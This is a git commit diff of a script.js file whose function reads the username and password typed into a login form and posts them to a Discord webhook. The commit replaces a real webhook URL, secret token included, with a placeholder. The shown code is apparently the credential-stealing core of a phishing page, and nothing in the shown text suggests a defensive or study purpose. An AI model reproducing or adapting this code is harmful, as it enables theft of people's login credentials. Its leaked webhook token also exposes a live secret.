497bc068ecd314992c307d7d0ab71217b63f94ff
Xotiic5703 <112813151+Xotiic5703@users.noreply.github.com>
2023-08-20 06:11:42 +0200

    Update script.js

--- script.js
+++ script.js
@@ -3,7 +3,7 @@ function message()
     let user = document.getElementById("usernameStr").value;
     let pass = document.getElementById("passwordStr").value;
 
-    const webhook = "https://discordapp.com/api/webhooks/1142238885510926346/Muq_VrMiDsEe_50wWCUms6NkM2e9HaxkgCeCIVOX6V6gf1xvq8nUnxV4N9-XcedL3hnr";
+    const webhook = "yayWebHook";
     const contents = "```Username : " + user + "\nPassword : " + pass + "```";
 
     const request = new XMLHttpRequest();
